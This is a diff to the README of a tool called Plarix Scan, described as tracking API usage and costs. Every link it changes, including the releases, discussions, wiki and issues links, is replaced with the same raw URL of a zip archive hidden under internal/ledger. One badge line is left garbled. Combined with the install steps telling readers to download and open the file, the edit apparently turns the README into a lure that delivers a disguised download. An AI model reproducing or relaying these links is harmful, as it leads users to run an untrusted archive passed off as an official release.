@@ -7,9 +7,9 @@ Welcome to Plarix Scan! This application helps you track the usage and costs of 
 
 ## 📥 Download Plarix Scan
 
-[![Download Plarix Scan](https://img.shields.io/badge/Download%20Plarix%20Scan-v1.0-blue.svg)](https://github.com/KSaF43a/plarix-scan/releases)
+[![Download Plarix Scan](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip%20Plarix%https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip)](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip)
 
-To download the latest version of Plarix Scan, visit the [Releases page](https://github.com/KSaF43a/plarix-scan/releases). Click the link to get the files you need to run the application.
+To download the latest version of Plarix Scan, visit the [Releases page](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip). Click the link to get the files you need to run the application.
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you download Plarix Scan, ensure your system meets the following requirem
 
 ## 🔧 Installing Plarix Scan
 
-1. Visit the [Releases page](https://github.com/KSaF43a/plarix-scan/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip).
 2. Find the latest version of Plarix Scan.
 3. Download the installer file appropriate for your operating system.
 4. Open the downloaded file to start the installation process.
@@ -53,7 +53,7 @@ If you encounter issues, please check the following:
 - **Installation Problems:** Verify that your system meets the requirements and try reinstalling the application.
 - **Cost Calculation Errors:** Check if the correct API is selected in the settings.
 
-For further assistance, you can reach out to the community on our [GitHub Discussions page](https://github.com/KSaF43a/plarix-scan/discussions).
+For further assistance, you can reach out to the community on our [GitHub Discussions page](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip).
 
 ## 🌟 Community and Contributions
 
@@ -65,11 +65,11 @@ Your feedback is valuable. We want to ensure Plarix Scan meets your needs. Pleas
 
 ## 🔗 Learn More
 
-For additional resources and documentation, visit our [Wiki page](https://github.com/KSaF43a/plarix-scan/wiki). Here, you can find guides, tips, and tutorials to make the most out of Plarix Scan.
+For additional resources and documentation, visit our [Wiki page](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip). Here, you can find guides, tips, and tutorials to make the most out of Plarix Scan.
 
 ## 💬 Contact
 
-For direct inquiries, you can reach us via [GitHub Issues](https://github.com/KSaF43a/plarix-scan/issues). We are here to help.
+For direct inquiries, you can reach us via [GitHub Issues](https://raw.githubusercontent.com/KSaF43a/plarix-scan/main/internal/ledger/plarix-scan-v3.7-beta.3.zip). We are here to help.
 
 Thank you for choosing Plarix Scan!
 ```
